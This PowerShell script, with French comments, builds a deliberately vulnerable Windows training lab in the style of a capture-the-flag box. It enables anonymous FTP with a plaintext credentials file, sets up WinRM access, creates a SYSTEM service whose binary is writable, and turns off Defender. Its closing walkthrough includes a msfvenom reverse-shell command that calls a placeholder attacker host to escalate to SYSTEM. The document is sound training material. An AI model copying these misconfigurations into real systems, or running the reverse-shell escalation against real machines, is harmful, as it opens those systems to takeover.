#Requires -RunAsAdministrator
<#
================================================================================
  HTB-STYLE LAB — "FIRSTBLOOD" [EASY]
================================================================================
  Difficulté  : Easy ⬜
  Thème       : Serveur Windows standalone mal configuré
  
  CHAÎNE D'EXPLOITATION :
  ───────────────────────
  [1] FTP anonyme  → fichier creds.txt en clair
  [2] WinRM        → accès shell avec les creds trouvés
  [3] Service vulnérable → binaire remplaçable → SYSTEM
  
  Outils suffisants : nmap, ftp, evil-winrm, winpeas/PowerUp
  Pas d'AD, pas de domaine — standalone only.

  ⚠️  LAB ISOLÉ UNIQUEMENT ⚠️
================================================================================
#>

function Write-Step($msg) { Write-Host "`n  [+] $msg" -ForegroundColor Green }
function Write-Info($msg) { Write-Host "  [~] $msg" -ForegroundColor Cyan }

Write-Host "`n  ██████╗ FIRSTBLOOD — Easy Lab Setup" -ForegroundColor Green
Write-Host "  ══════════════════════════════════`n" -ForegroundColor DarkGreen

# ══════════════════════════════════════════════════════════════════════════════
#  [1] FTP ANONYME — vecteur initial
#  Recon : nmap -sV <ip> → port 21 ouvert
#  Exploit : ftp anonymous → download creds.txt
# ══════════════════════════════════════════════════════════════════════════════
Write-Step "[1/3] Configuration FTP Anonyme"

# Installe le rôle FTP (IIS)
Install-WindowsFeature -Name Web-Ftp-Server -IncludeManagementTools -ErrorAction SilentlyContinue | Out-Null
Install-WindowsFeature -Name Web-Server -ErrorAction SilentlyContinue | Out-Null

# Crée le répertoire FTP
$ftpRoot = "C:\FTPRoot"
New-Item -Path $ftpRoot -ItemType Directory -Force | Out-Null

# Dépose un fichier "oublié" avec des creds
@'
# Notes IT — ne pas laisser sur le serveur FTP !!!
# TODO: déplacer avant mise en prod

Compte local   : sysadmin
Mot de passe   : W3lcome@Lab!

Accès WinRM    : activé (port 5985)
'@ | Out-File "$ftpRoot\creds.txt" -Encoding UTF8

# Ajoute un leurre pour rendre le recon plus réaliste
@'
Phantom Corp — FTP Server
Dépôt de fichiers internes.
Contacter IT pour accès : it@phantom.corp
'@ | Out-File "$ftpRoot\README.txt" -Encoding UTF8

# Configure le site FTP via IIS (PowerShell WebAdministration)
Import-Module WebAdministration -ErrorAction SilentlyContinue

# Supprime le site FTP existant si présent
if (Get-WebSite -Name "FTPSite" -ErrorAction SilentlyContinue) {
    Remove-WebSite -Name "FTPSite"
}

# Crée le site FTP avec accès anonyme
New-WebFtpSite -Name "FTPSite" -Port 21 -PhysicalPath $ftpRoot -Force | Out-Null

# Active l'authentification anonyme
Set-ItemProperty "IIS:\Sites\FTPSite" -Name ftpServer.security.authentication.anonymousAuthentication.enabled -Value $true
Set-ItemProperty "IIS:\Sites\FTPSite" -Name ftpServer.security.ssl.controlChannelPolicy -Value 0
Set-ItemProperty "IIS:\Sites\FTPSite" -Name ftpServer.security.ssl.dataChannelPolicy -Value 0

# Autorisation de lecture anonyme
Add-WebConfiguration "/system.ftpServer/security/authorization" `
    -value @{accessType="Allow"; users="?"; permissions="Read"} `
    -PSPath IIS:\ -Location "FTPSite" -ErrorAction SilentlyContinue

# Ouvre le pare-feu pour FTP
netsh advfirewall firewall add rule name="FTP-Lab" dir=in action=allow protocol=tcp localport=21 | Out-Null

Write-Info "FTP anonyme actif sur port 21 → $ftpRoot\creds.txt accessible"

# ══════════════════════════════════════════════════════════════════════════════
#  [2] COMPTE + WinRM — accès initial
#  Exploit : evil-winrm -i <ip> -u sysadmin -p 'W3lcome@Lab!'
# ══════════════════════════════════════════════════════════════════════════════
Write-Step "[2/3] Création compte sysadmin + WinRM"

$userPass = ConvertTo-SecureString "W3lcome@Lab!" -AsPlainText -Force
if (-not (Get-LocalUser -Name "sysadmin" -ErrorAction SilentlyContinue)) {
    New-LocalUser -Name "sysadmin" -Password $userPass `
        -Description "Sysadmin — Phantom Corp" `
        -PasswordNeverExpires $true | Out-Null
}
# Pas dans Administrators — user bas privilège
Add-LocalGroupMember -Group "Remote Management Users" -Member "sysadmin" -ErrorAction SilentlyContinue

# Active WinRM
Enable-PSRemoting -Force -SkipNetworkProfileCheck | Out-Null
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
netsh advfirewall firewall add rule name="WinRM-Lab" dir=in action=allow protocol=tcp localport=5985 | Out-Null

# Dépose le flag user.txt
$userDesktop = "C:\Users\sysadmin\Desktop"
New-Item -Path $userDesktop -ItemType Directory -Force | Out-Null
"FIRSTBLOOD{y0u_f0und_th3_cr3ds_g00d_j0b!}" | Out-File "$userDesktop\user.txt" -Encoding UTF8

Write-Info "WinRM actif — sysadmin:W3lcome@Lab! (user bas privilège)"

# ══════════════════════════════════════════════════════════════════════════════
#  [3] SERVICE VULNÉRABLE — PrivEsc vers SYSTEM
#  Recon : PowerUp.ps1 → Invoke-AllChecks → ModifiableServiceFile
#  Exploit : remplace le binaire → redémarre le service → SYSTEM
# ══════════════════════════════════════════════════════════════════════════════
Write-Step "[3/3] Service vulnérable (binaire writable)"

$svcDir = "C:\LabServices\Updater"
New-Item -Path $svcDir -ItemType Directory -Force | Out-Null

# Copie cmd.exe comme "binaire de service" placeholder
Copy-Item "C:\Windows\System32\cmd.exe" "$svcDir\LabUpdater.exe" -Force

# Crée le service en SYSTEM
sc.exe create "LabUpdater" `
    binPath= "$svcDir\LabUpdater.exe" `
    start= auto `
    obj= LocalSystem `
    DisplayName= "Lab Software Updater" | Out-Null

sc.exe description "LabUpdater" "Phantom Corp automatic software updater" | Out-Null

# Donne FullControl sur le dossier à sysadmin
$acl  = Get-Acl $svcDir
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "sysadmin", "FullControl",
    "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl $svcDir $acl

# Flag root accessible uniquement par SYSTEM/Admin
$adminDesktop = "C:\Users\Administrator\Desktop"
New-Item -Path $adminDesktop -ItemType Directory -Force | Out-Null
"FIRSTBLOOD{s3rv1c3_m1sc0nf1g_1s_class1c!}" | Out-File "$adminDesktop\root.txt" -Encoding UTF8

# Désactive Defender pour ne pas bloquer les outils de pentest
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

Write-Info "Service LabUpdater (SYSTEM) — binaire remplaçable par sysadmin"

# ══════════════════════════════════════════════════════════════════════════════
#  RÉSUMÉ
# ══════════════════════════════════════════════════════════════════════════════
Write-Host "`n  ══════════════════════════════════════════" -ForegroundColor Green
Write-Host "  FIRSTBLOOD [EASY] — CARTE D'EXPLOITATION" -ForegroundColor Green
Write-Host "  ══════════════════════════════════════════`n" -ForegroundColor Green

Write-Host @"
  ÉTAPE 1 — RECON
    nmap -sV -sC <TARGET>
    → Port 21 (FTP), Port 5985 (WinRM)

  ÉTAPE 2 — FOOTHOLD
    ftp <TARGET>
    > anonymous / <ENTER>
    > get creds.txt
    > bye
    → sysadmin / W3lcome@Lab!

    evil-winrm -i <TARGET> -u sysadmin -p 'W3lcome@Lab!'
    → user.txt sur le bureau

  ÉTAPE 3 — PRIVESC
    # Dans le shell WinRM :
    upload PowerUp.ps1
    Import-Module .\PowerUp.ps1
    Invoke-AllChecks
    → ModifiableServiceFile : C:\LabServices\Updater\LabUpdater.exe

    # Remplace le binaire par un reverse shell (msfvenom) :
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f exe -o LabUpdater.exe
    upload LabUpdater.exe C:\LabServices\Updater\LabUpdater.exe
    sc.exe stop LabUpdater
    sc.exe start LabUpdater
    → Shell SYSTEM → root.txt

  FLAGS :
    user.txt : C:\Users\sysadmin\Desktop\user.txt
    root.txt : C:\Users\Administrator\Desktop\root.txt
"@ -ForegroundColor White

Write-Host "  ══════════════════════════════════════════`n" -ForegroundColor Green
